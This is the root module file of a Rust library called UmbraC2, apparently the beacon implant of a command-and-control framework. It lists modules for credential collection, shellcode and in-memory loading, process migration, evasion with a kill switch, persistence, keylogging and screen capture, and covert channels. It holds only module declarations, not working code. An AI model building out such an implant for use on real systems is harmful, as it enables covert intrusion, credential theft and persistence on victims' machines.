//! UmbraC2 beacon library.
//!
//! Layers (bottom to top):
//!   upk      canonical binary encoding        (contracts/vectors.json)
//!   crypto   X25519 + HKDF-SHA256 + AEAD
//!   wire     frame format and message registry
//!   session  per-connection key/nonce state machine
//!   transport TCP, HTTP and DNS channels
//!   link     the client half of the handshake (beacon and pivot callback)
//!   tunnel   pivot callbacks and peer-to-peer links
//!   vpn      the layer-3 tunnel client
//!   ws       the WebSocket transport
//!   bof      in-memory COFF loader
//!   manifest the module ABI: the manifest of a module and its schema
//!   migrate  process migration: the work moves into another process
//!   wasm     a small webassembly interpreter
//!   script   the sandboxed script dialect
//!   shellcode raw position independent shellcode
//!   post     in-memory post-exploitation helpers
//!   creds    the credential collection with a structured result
//!   remote   the remote execution through the pivots
//!   domain   active directory reconnaissance
//!   evade    the posture engine: the environment, the schedule and the
//!            kill switch
//!   hygiene  the memory and the process hygiene
//!   task     command execution
//!   triage   file triage and search
//!   netinfo  the network configuration of the host
//!   sessions interactive sessions (a process the operator writes to)
//!   desktop the screen, the clipboard and the keyboard
//!   persist the persistence manager and its technique catalogue
//!   install replacing the running implant with a new build
//!   proc    the process table of the host
//!   registry the Windows registry
//!   beacon   the actual loop

pub mod beacon;
pub mod bof;
pub mod config;
pub mod creds;
pub mod crypto;
pub mod dns;
pub mod domain;
pub mod evade;
pub mod hygiene;
pub mod install;
pub mod link;
pub mod manifest;
pub mod mail;
pub mod migrate;
pub mod netinfo;
pub mod persist;
pub mod post;
pub mod proc;
pub mod profile;
pub mod registry;
pub mod remote;
pub mod s3;
pub mod script;
pub mod session;
pub mod sessions;
pub mod shellcode;
pub mod sysinfo;
pub mod task;
pub mod transport;
pub mod triage;
pub mod tunnel;
pub mod upk;
pub mod vpn;
pub mod wasm;
pub mod desktop;
pub mod ws;
pub mod wire;

pub use beacon::Beacon;
pub use config::Config;
